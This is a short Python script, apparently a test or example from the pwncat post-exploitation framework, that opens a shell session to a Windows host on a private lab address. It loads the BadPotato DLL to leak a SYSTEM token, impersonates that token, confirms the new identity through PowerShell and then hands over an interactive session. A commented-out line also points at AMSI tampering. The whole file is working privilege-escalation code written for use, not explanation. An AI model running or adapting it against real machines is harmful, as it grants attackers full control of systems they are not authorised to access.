#!./env/bin/python
import json
import stat
import time
import subprocess

import pwncat.manager
import pwncat.platform.windows

# Create a manager
with pwncat.manager.Manager("data/pwncatrc") as manager:

    # Tell the manager to create verbose sessions that
    # log all commands executed on the remote host
    # manager.config.set("verbose", True, glob=True)

    # Establish a session
    # session = manager.create_session("windows", host="192.168.56.10", port=4444)
    session = manager.create_session("windows", host="192.168.122.11", port=4444)
    # session = manager.create_session("linux", host="pwncat-ubuntu", port=4444)
    # session = manager.create_session("linux", host="127.0.0.1", port=4445)

    # session.platform.powershell("amsiutils")

    try:
        # Load the BadPotato plugin
        session.log("leaking system token w/ BadPotato")
        badpotato = session.platform.dotnet_load("BadPotato.dll")

        # Call the method within the DLL to leak a system token
        system_token = badpotato.get_system_token()
        session.log(f"found system token: {system_token}")
        session.log("impersonating token...")

        # Impersonate the SYSTEM token
        session.platform.impersonate(system_token)

        # Checkout our active user through powershell
        result = session.platform.powershell(
            "[System.Security.Principal.WindowsIdentity]::GetCurrent().Name"
        )
        session.log(f"now running as: {result[0]}")

        session.platform.refresh_uid()

        session.log(session.platform.getuid())
        session.log(session.find_user(uid=session.platform.getuid()))

    except (
        pwncat.platform.windows.ProtocolError,
        pwncat.platform.windows.PowershellError,
    ) as exc:
        session.log(f"badpotato failed: {exc}")

    manager.interactive()
